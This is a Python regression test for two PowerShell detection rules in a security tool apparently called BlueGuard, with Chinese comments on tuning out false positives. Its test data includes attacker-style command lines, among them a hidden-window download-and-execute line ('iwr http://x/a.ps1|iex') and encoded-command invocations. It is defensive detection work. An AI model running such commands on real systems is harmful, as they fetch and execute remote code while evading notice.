# -*- coding: utf-8 -*-
"""PowerShell 两条规则的调优回归：真攻击要打得中，运维写法要放得过。

为什么单独固化这两个：它们踩过两次真实的误报，而且都是"看起来很像"的那种。
  ① -NoProfile / -NonInteractive 是几乎所有后台调用的标配（BlueGuard 自己也在用），
     拿它当特征会把自己吵死。
  ② 在整条命令行里搜 -WindowStyle，会把脚本正文里的
     `Start-Process xxx -WindowStyle Hidden` 也算上 —— 运维脚本天天这么写。
     修法是负向前瞻：遇到 -Command/-File 就停止匹配，只看 PowerShell 自己的参数区。

跑法：
    python tests\bg_rules_ps.py
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backend.guard import rules  # noqa: E402

FAIL = []


def check(label, enc, hidden, want_enc, want_hidden):
    ok = (enc == want_enc) and (hidden == want_hidden)
    if not ok:
        FAIL.append(label)
    print("%s  %-46s enc=%-5s hidden=%-5s" % ("PASS" if ok else "FAIL", label, enc, hidden))


def main():
    rr = {r["rule_id"]: r for r in rules.builtin_rules()}
    enc_cond = rr["PS-ENCODED"]["condition"]
    hid_cond = rr["PS-HIDDEN"]["condition"]

    cases = [
        # 真攻击
        ("真攻击：-EncodedCommand", "pwsh.exe",
         '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA', True, True),
        ("真攻击：短写 -w h", "powershell.exe",
         "powershell.exe -w h -c calc", False, True),
        ("真攻击：-w hidden", "powershell.exe",
         "powershell.exe -nop -w hidden -c iwr http://x/a.ps1|iex", False, True),
        ("真攻击：-e base64", "powershell.exe",
         "powershell -e " + "A" * 60, True, False),
        ("真攻击：-enc 短写", "powershell.exe",
         "powershell -enc SQBFAFgA", True, False),
        # 运维/正常写法（必须放行）
        ("运维：脚本里 Start-Process -WindowStyle Hidden", "pwsh.exe",
         '"pwsh.exe" -NoLogo -NoProfile -NonInteractive -Command "Start-Process foo.exe -WindowStyle Hidden"', False, False),
        ("运维：DSH 工具调用", "pwsh.exe",
         '"pwsh.exe" -NoLogo -NoProfile -NonInteractive -Command "[Console]::OutputEncoding=...; cd C:\\work"', False, False),
        ("运维：-File 脚本 + 参数里带 windowstyle", "powershell.exe",
         "powershell.exe -NoProfile -File C:\\a.ps1 -WindowStyle Hidden", False, False),
        ("运维：BlueGuard 采集器自身", "pwsh.exe",
         '"pwsh.exe" -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand AAAA', True, False),
        ("无关进程：pwsh 命令行提到 encoded", "notepad.exe",
         'notepad.exe "C:\\notes\\encoded-command.txt"', False, False),
    ]

    for label, name, cl, we, wh in cases:
        obj = {"pid": 1, "name": name, "cmdline": cl}
        check(label, rules.evaluate(enc_cond, obj), rules.evaluate(hid_cond, obj), we, wh)

    print("\n失败项：%d" % len(FAIL))
    for f in FAIL:
        print("  -", f)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
